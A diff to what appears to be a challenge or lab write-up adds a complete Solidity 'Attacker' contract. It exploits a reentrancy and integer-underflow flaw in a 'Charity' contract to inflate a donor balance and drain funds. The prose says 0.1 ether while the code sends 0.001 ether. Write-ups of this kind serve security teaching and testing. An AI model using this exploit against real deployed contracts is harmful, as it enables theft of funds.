@@ -23,6 +23,37 @@ To execute the smart contract functions we are going to use ![Ethereum remix](ht
 
 ##### Creating attack.sol
 Looking onlien we can find examples of reentrency attacks. If we modify these examples we can use them here. We create a attack function that first executes the deposit function to deposit 0.1 ether. When we have deposited the ether we can then execute the vulnurable donateToContract function. We then have a fallback function that runes right before the donatorBalance is changed giving us an opportunity to withdraw our 0.1 ether. This leaves the donatorBalance at 0 untill after our fallback function is done executing as the donateToContract function executes the last line of code subtracting 0.1 ether from our donatorBalance that is 0. This create a underflow as 0 - 0.1 would be a negative value thus wrapping the unsigned integer around giving us a large donatorBalance.
+```sol
+pragma solidity 0.7.4;
+
+import './charity.sol';
+
+contract Attacker {
+    Charity public charity;
+    bool firstcall = true;
+    
+    constructor(address _etherBankAddress) {
+        charity = Charity(_etherBankAddress);
+    }
+    
+    function attack() public payable {
+        firstcall = true;
+        charity.deposit{ value: 1000000000000000 wei}();
+        charity.donateToContract(1000000000000000 wei);
+        charity.withdraw();
+    }
+
+    fallback() external payable {
+        if(firstcall == true) {
+            firstcall = false;
+            charity.withdraw();
+    }}
+    
+    function getBalance() public view returns(uint) {
+        return address(this).balance;
+    }
+}
+```
 
 #### Withdraw
 Now that our donatorBalance is a very high value we just use the withdraw function to withdraw. The withdraw function is set to withdraw all funds of the account even though we have a higher donatorBalance than the actual balance of the account.
